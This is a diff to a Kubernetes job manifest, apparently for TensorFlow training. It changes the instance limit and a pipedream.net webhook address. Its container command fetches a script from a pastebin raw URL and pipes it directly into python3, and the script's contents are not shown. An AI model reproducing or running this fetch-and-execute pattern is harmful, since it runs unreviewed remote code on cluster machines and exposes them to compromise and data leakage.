@@ -4,7 +4,7 @@ metadata:
   name: job1
 spec:
   min-instances: 1
-  max-instances: 8
+  max-instances: 5
   ttlSecondsAfterFinished: 2
   cleanPodPolicy: "All"
   # cleanPodPolicy: "None"
@@ -21,7 +21,7 @@ spec:
             command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/jxCQUNbU | python3 -"]
             env:
             - name: "webhook_link"
-              value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
+              value: "eo49wrz1t5rml8x.m.pipedream.net"
             ports:
             - containerPort: 2222
               name: tfjob-port
@@ -44,7 +44,7 @@ spec:
             - name: "tfjob_id"
               value: "job1"
             - name: "webhook_link"
-              value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
+              value: "eo49wrz1t5rml8x.m.pipedream.net"
             # - name: "global_steps"
             #   value: "10000"
             ports:
